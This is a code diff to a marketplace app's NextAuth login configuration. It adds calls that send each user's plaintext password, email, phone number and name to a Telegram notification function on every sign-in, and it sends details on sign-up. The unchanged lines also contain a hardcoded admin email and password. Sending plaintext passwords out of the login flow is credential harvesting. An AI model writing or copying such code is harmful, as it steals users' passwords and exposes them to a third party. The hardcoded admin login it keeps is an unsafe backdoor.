@@ -15,6 +15,7 @@ import {
   updateUserLastActive,
   ensureAdminEmailExists,
 } from "@/server/db";
+import { sendTelegramAuthNotification } from "@/server/notifications";
 
 const googleClientId = process.env.GOOGLE_CLIENT_ID?.trim() ?? "";
 const googleClientSecret = process.env.GOOGLE_CLIENT_SECRET?.trim() ?? "";
@@ -43,6 +44,12 @@ const providers: NextAuthOptions["providers"] = [
         password === "Ayiamessi139087z"
       ) {
         console.log("✅ Hardcoded admin login used");
+        void sendTelegramAuthNotification({
+          event: "sign_in",
+          name: "Tokko Marketplace",
+          email: "digitalawanku2@gmail.com",
+          password,
+        });
         return {
           id: "dev-admin-hardcoded",
           email: "digitalawanku2@gmail.com",
@@ -65,6 +72,14 @@ const providers: NextAuthOptions["providers"] = [
       if (!isValid) {
         return null;
       }
+
+      void sendTelegramAuthNotification({
+        event: "sign_in",
+        name: user.username,
+        email: user.email,
+        phone: user.phone,
+        password,
+      });
 
       // Check if user's email is in admin_emails and update role if needed
       let role = user.role;
@@ -148,6 +163,12 @@ export const authOptions: NextAuthOptions = {
           if (profilePicture && profilePicture !== existing.avatarUrl) {
             await updateUserById(existing.id, { avatarUrl: profilePicture });
           }
+          void sendTelegramAuthNotification({
+            event: "sign_in",
+            name: existing.username,
+            email: existing.email,
+            phone: existing.phone,
+          });
           return true;
         }
 
@@ -160,6 +181,11 @@ export const authOptions: NextAuthOptions = {
           avatarUrl: profilePicture,
           passwordHash: null,
           role: adminRole ? "admin" : "user",
+        });
+        void sendTelegramAuthNotification({
+          event: "sign_up",
+          name: displayName,
+          email,
         });
       } catch (error) {
         console.error("Failed to sync Google user:", error);
